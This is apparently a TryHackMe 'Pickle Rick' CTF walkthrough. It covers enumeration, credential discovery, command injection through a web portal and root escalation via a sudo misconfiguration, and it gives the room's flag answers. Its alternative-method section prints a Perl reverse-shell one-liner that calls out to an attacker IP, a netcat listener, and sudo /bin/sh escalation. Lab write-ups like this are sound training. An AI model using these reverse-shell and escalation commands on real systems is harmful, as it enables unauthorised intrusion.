# Pickle Rick CTF Walkthrough

**Target:** Pickle Rick  
**Source:** [TryHackMe](https://tryhackme.com/room/picklerick)  
**Difficulty:** Easy  
**Target IP:** 10.114.158.121

## Table of Contents
- [Overview](#overview)
- [Reconnaissance](#reconnaissance)
- [Web Enumeration](#web-enumeration)
- [Web Shell Access & Ingredient Hunting](#web-shell-access--ingredient-hunting)
- [Reverse Shell (Alternative Method)](#reverse-shell-alternative-method)
- [Privilege Escalation](#privilege-escalation)
- [Ingredients](#ingredients)
- [Vulnerabilities](#vulnerabilities)

---

## Overview

Pickle Rick is an easy, Rick and Morty themed Linux box. The objective is to log
into Rick's web portal and recover the three secret ingredients needed to finish
his pickle-reverse potion. The attack chain covers web source enumeration to
recover a username, a `robots.txt` disclosure for the password, directory brute
forcing to find a hidden login page, command execution through the authenticated
portal, and a trivial `sudo` misconfiguration for root.

**Key Skills Required:**
- Network scanning and service enumeration
- Web source review and `robots.txt` inspection
- Directory brute forcing with Gobuster
- Command injection through a web portal
- Reverse shell generation and shell stabilisation
- Linux privilege escalation via `sudo` misconfiguration

---

## Reconnaissance

### Network Scanning

```bash
nmap -sV -sC -p- 10.114.158.121
```

**Results:**

| Port | Service | Version |
|------|---------|---------|
| 22/tcp | ssh | OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 |
| 80/tcp | http | Apache httpd 2.4.41 (Ubuntu) |

The HTTP title is `Rick is sup4r cool`. Two ports are open: SSH on the default
port and an Apache web server.

---

## Web Enumeration

### Landing Page

```bash
curl 10.114.158.121
```

The page shows Rick begging Morty for help recovering his lost password. The
HTML source hides a comment with the username:

```
Note to self, remember username!
Username: R1ckRul3s
```

### robots.txt

```bash
curl 10.114.158.121/robots.txt
Wubbalubbadubdub
```

This single string turns out to be the portal password.

```
username: R1ckRul3s
password: Wubbalubbadubdub
```

### Directory Brute Force

```bash
gobuster dir -u http://10.114.158.121 -w /usr/share/wordlists/rockyou.txt
```

```
/index.html
/robots.txt
/login.php
```

The discovery of `login.php` reveals the portal login page.

```bash
curl http://10.114.158.121/login.php
```

The page renders a "Portal Login Page" form posting to itself. Logging in with
`R1ckRul3s : Wubbalubbadubdub` redirects to `portal.php`.

---

## Web Shell Access & Ingredient Hunting

The portal at `http://10.114.158.121/portal.php` exposes a "Commands" field that
executes input directly on the system, effectively giving a web shell as the
`www-data` user.

```bash
whoami
www-data
```

```bash
ls -l
-rwxr-xr-x 1 ubuntu ubuntu   17 Feb 10  2019 Sup3rS3cretPickl3Ingred.txt
drwxrwxr-x 2 ubuntu ubuntu 4096 Feb 10  2019 assets
-rwxr-xr-x 1 ubuntu ubuntu   54 Feb 10  2019 clue.txt
-rwxr-xr-x 1 ubuntu ubuntu 1105 Feb 10  2019 denied.php
-rwxrwxrwx 1 ubuntu ubuntu 1062 Feb 10  2019 index.html
-rwxr-xr-x 1 ubuntu ubuntu 1438 Feb 10  2019 login.php
-rwxr-xr-x 1 ubuntu ubuntu 2044 Feb 10  2019 portal.php
-rwxr-xr-x 1 ubuntu ubuntu   17 Feb 10  2019 robots.txt
```

### First Ingredient

`cat` is disabled in the portal, so `strings` is used instead:

```bash
cat Sup3rS3cretPickl3Ingred.txt
Command disabled to make it hard for future PICKLEEEE RICCCKKKK.

strings Sup3rS3cretPickl3Ingred.txt
mr. meeseek hair
```

> **First ingredient:** `mr. meeseek hair`

### Following the Clue

```bash
strings clue.txt
Look around the file system for the other ingredient.
```

### Second Ingredient

```bash
ls /home
rick
ubuntu

ls /home/rick
second ingredients

strings "/home/rick/second ingredients"
1 jerry tear
```

> **Second ingredient:** `1 jerry tear`

### Third Ingredient

Checking `sudo` privileges shows `www-data` can run anything as root without a
password:

```bash
sudo -l
User www-data may run the following commands on ip-10-114-158-121:
    (ALL) NOPASSWD: ALL

sudo ls -l /root
-rw-r--r-- 1 root root   29 Feb 10  2019 3rd.txt
drwxr-xr-x 4 root root 4096 Jul 11  2024 snap

sudo strings /root/3rd.txt
3rd ingredients: fleeb juice
```

> **Third ingredient:** `fleeb juice`

---

## Reverse Shell (Alternative Method)

Instead of working through the web portal, a proper interactive shell can be
obtained. Checking available binaries reveals Perl is installed, so a Perl
reverse shell is used.

### Set Up the Listener

```bash
nc -nvlp 1234
```

### Trigger the Reverse Shell

Run the following through the portal (replace the IP with your own tun0/VPN IP):

```bash
perl -e 'use Socket;$i="192.168.132.9";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### Stabilising the Shell

Spawn a proper PTY and set the environment so interactive programs behave
correctly:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
export SHELL=bash
```

With a stable shell, the second ingredient can be read directly with `cat`:

```bash
ls
'second ingredients'

cat 'second ingredients'
1 jerry tear
```

---

## Privilege Escalation

The `sudo -l` output confirms `www-data` may run any command as root without a
password:

```bash
sudo -l
User www-data may run the following commands on ip-10-114-158-121:
    (ALL) NOPASSWD: ALL
```

Dropping into a root shell is trivial:

```bash
sudo /bin/sh
# whoami
root
# cd /root
# ls
3rd.txt  snap
# cat 3rd.txt
3rd ingredients: fleeb juice
```

---

## Ingredients

| Ingredient | Value | Location |
|------------|-------|----------|
| First ingredient | `mr. meeseek hair` | `Sup3rS3cretPickl3Ingred.txt` (web root) |
| Second ingredient | `1 jerry tear` | `/home/rick/second ingredients` |
| Final ingredient | `fleeb juice` | `/root/3rd.txt` |

---

## Vulnerabilities

### 1. Credentials Exposed in Client-Side Source & robots.txt (High)

**Description:** The username (`R1ckRul3s`) was left in an HTML comment in the
landing page source, and the portal password (`Wubbalubbadubdub`) was disclosed
in `robots.txt`, both served to every visitor without authentication.

**Impact:** Full recovery of valid portal credentials with no authentication.

**Mitigation:**
- Never embed secrets in client-side code, comments, or `robots.txt`.
- Enforce password rotation away from defaults.

### 2. Command Injection via Web Portal (Critical)

**Description:** The `portal.php` "Commands" field passed user input directly to
the system shell, allowing arbitrary command execution as `www-data`.

**Impact:** Initial foothold on the host and ability to read sensitive files.

**Mitigation:**
- Never pass user input to a shell.
- Validate and sanitise all input; run the web service with least privilege.

### 3. Sudo Misconfiguration — NOPASSWD ALL (Critical)

**Description:** The `www-data` account was granted `(ALL) NOPASSWD: ALL`,
allowing any command to be run as root without a password.

**Impact:** Full privilege escalation from `www-data` to `root`.

**Mitigation:**
- Apply least privilege in `sudoers`; never grant `NOPASSWD: ALL` to service
  accounts.
- Restrict `sudo` rights to the specific commands a user actually needs.

---

## Attack Chain Summary

```
Nmap scan → 2 open ports (SSH, HTTP)
    ↓
Web source (index.html comment) → username R1ckRul3s
    ↓
robots.txt → password Wubbalubbadubdub
    ↓
Gobuster → /login.php discovered
    ↓
Portal login (R1ckRul3s : Wubbalubbadubdub) → portal.php command execution
    ↓
Web shell as www-data → strings on disabled files
    ↓
Ingredient 1: mr. meeseek hair (web root)
    ↓
Ingredient 2: 1 jerry tear (/home/rick)
    ↓
sudo -l → (ALL) NOPASSWD: ALL
    ↓
sudo /bin/sh → root shell
    ↓
Ingredient 3: fleeb juice (/root/3rd.txt)
    ↓
Complete system compromise
```

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Nmap | Port scanning and service/version detection |
| curl | Web source review and robots.txt inspection |
| Gobuster | Directory brute forcing |
| Web portal | Command injection foothold |
| Perl | Reverse shell generation |
| Netcat | Reverse-shell listener |
| strings | Reading files with cat disabled |

---

## References

- [TryHackMe — Pickle Rick](https://tryhackme.com/room/picklerick)
- [Nmap](https://nmap.org/)
- [Gobuster](https://github.com/OJ/gobuster)

---
